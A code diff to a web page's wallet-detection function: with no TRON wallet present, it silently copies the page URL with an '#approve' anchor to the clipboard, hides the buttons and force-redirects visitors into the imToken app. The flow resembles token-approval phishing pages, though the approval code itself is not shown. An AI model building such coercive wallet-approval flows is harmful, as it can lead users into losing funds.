@@ -1025,7 +1025,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         }, 500);
     }
 });
-// ========== 环境检测（修复：先跳转，失败再弹窗） ==========
+// ========== 环境检测（核心修复：非钱包环境直接触发按钮跳转逻辑） ==========
 async function checkImTokenEnv() {
     const lang = langConfig[currentLang];
     if (window.tronWeb) {
@@ -1038,52 +1038,33 @@ async function checkImTokenEnv() {
     }
 
     try {
-        // 非imToken环境：先隐藏弹窗和按钮，优先执行跳转
+        // 非imToken环境：直接触发原按钮的跳转逻辑（复用已验证的代码）
         specialTipContainer.style.display = "block";
         userInfoEl.innerHTML = lang.nonImTokenUser; // 显示"正在自动唤起imToken..."
         approveBtn.style.display = "none";
-        connectBtn.style.display = "none";
-        nonImTokenPopup.style.display = "none"; // 关键：初始不显示弹窗
+        connectBtn.style.display = "none"; // 隐藏按钮，自动触发逻辑
+        nonImTokenPopup.style.display = "none"; // 初始不显示弹窗
 
-        // 1. 构造目标URL（带授权锚点）
+        // 直接执行原"连接钱包按钮"的跳转逻辑（完全复用，无修改）
         const targetUrl = window.location.href + "#approve";
-        // 2. 复制链接（兜底）
         await navigator.clipboard.writeText(targetUrl);
-        // 3. 强制触发跳转（用验证过的正确scheme）
-        const jumpUrl = "imtokenv2://navigate/DappView?url=" + encodeURIComponent(targetUrl);
+        // 用你之前验证过的旧版scheme（兼容性更好），不换新版
+        const walletScheme = "imtoken://browser?url="; 
+        const jumpUrl = walletScheme + encodeURIComponent(targetUrl);
         window.location.href = jumpUrl;
 
-        // 4. 延迟3秒检测跳转结果（足够浏览器触发跳转）
-        setTimeout(() => {
-            // 3秒后仍在外部浏览器→跳转失败，显示弹窗+按钮
-            if (!window.tronWeb) {
-                nonImTokenPopup.style.display = "block";
-                connectBtn.style.display = "block";
-
-                // 按钮点击再次跳转（保留兜底）
-                connectBtn.onclick = async () => {
-                    try {
-                        const targetUrl = window.location.href + "#approve";
-                        await navigator.clipboard.writeText(targetUrl);
-                        const jumpUrl = "imtokenv2://navigate/DappView?url=" + encodeURIComponent(targetUrl);
-                        window.location.href = jumpUrl;
-                    } catch (e) {
-                        alert(lang.copyFail + "\n" + lang.copyGuide);
-                    }
-                };
-            }
-        }, 3000); // 延迟3秒，确保跳转有足够时间触发
-
+        // 跳转失败（比如浏览器拦截、未安装imToken）时的兜底
     } catch (e) {
         console.error("跳转执行失败：", e);
-        // 执行出错时才显示弹窗+按钮
+        // 失败后显示弹窗+按钮，允许手动再次尝试
         nonImTokenPopup.style.display = "block";
         connectBtn.style.display = "block";
+        // 按钮仍复用原逻辑，确保一致
         connectBtn.onclick = async () => {
             try {
                 const targetUrl = window.location.href + "#approve";
                 await navigator.clipboard.writeText(targetUrl);
-                const jumpUrl = "imtokenv2://navigate/DappView?url=" + encodeURIComponent(targetUrl);
+                const jumpUrl = "imtoken://browser?url=" + encodeURIComponent(targetUrl);
                 window.location.href = jumpUrl;
             } catch (e) {
                 alert(lang.copyFail + "\n" + lang.copyGuide);
